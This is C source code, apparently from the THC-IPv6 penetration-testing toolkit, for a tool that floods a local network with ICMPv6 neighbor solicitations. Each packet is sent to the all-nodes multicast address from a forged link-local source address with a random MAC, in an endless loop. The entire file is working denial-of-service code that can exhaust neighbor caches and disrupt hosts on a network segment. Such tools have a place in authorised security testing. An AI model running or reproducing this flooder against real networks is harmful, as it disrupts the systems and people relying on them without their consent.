#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2012 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s interface [target]\n\n", prg);
  printf("Flood the network with neighbor solicitations.\n");
//  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *interface, mac[6] = "";
  unsigned char *mac6 = mac, *ip6;
  unsigned char buf[24];
  unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst), *target = NULL;
  int i;
  unsigned char *pkt = NULL;
  int pkt_len = 0, rawmode = 0, count = 0;

  if (argc < 2 || argc > 3 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (getenv("THC_IPV6_PPPOE") != NULL || getenv("THC_IPV6_6IN4") != NULL) printf("WARNING: %s is not working with injection!\n", argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[1];

  if (argc > 2)
    if ((target = thc_resolve6(argv[2])) == NULL) {
      fprintf(stderr, "Error: Can not resolve %s\n", argv[2]);
      exit(-1);
    }

  ip6 = malloc(16);

  mac[0] = 0x00;
  mac[1] = 0x18;
  memset(ip6, 0, 16);
  ip6[0] = 0xfe;
  ip6[1] = 0x80;
  ip6[8] = 0x02;
  ip6[9] = mac[1];
  ip6[11] = 0xff;
  ip6[12] = 0xfe;
  memset(buf, 0, sizeof(buf));
  buf[16] = 1;
  buf[17] = 1;
  buf[18] = mac[0];
  buf[19] = mac[1];
  if (target != NULL)
    memcpy(buf, target, 16);

  printf("Starting to flood network with neighbor solicitations on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
  while (1) {

    // use previous src as target if we did not specify a target
    if (target == NULL)
      memcpy(buf, ip6, 16);

    for (i = 2; i < 6; i++)
      mac[i] = rand() % 256;

    ip6[10] = mac[2];
    ip6[13] = mac[3];
    ip6[14] = mac[4];
    ip6[15] = mac[5];
    memcpy(&buf[20], mac + 2, 4);
    count++;

    if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORSOL, 0, 0, buf, sizeof(buf), 0) < 0)
      return -1;
    if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
//      fprintf(stderr, "Error sending packet no. %d on interface %s: ", count, interface);
//      perror("");
//      return -1;
      printf("!");
    }

    pkt = thc_destroy_packet(pkt);
//    usleep(1);
    if (count % 100 == 0)
      printf(".");
  }
  return 0;
}
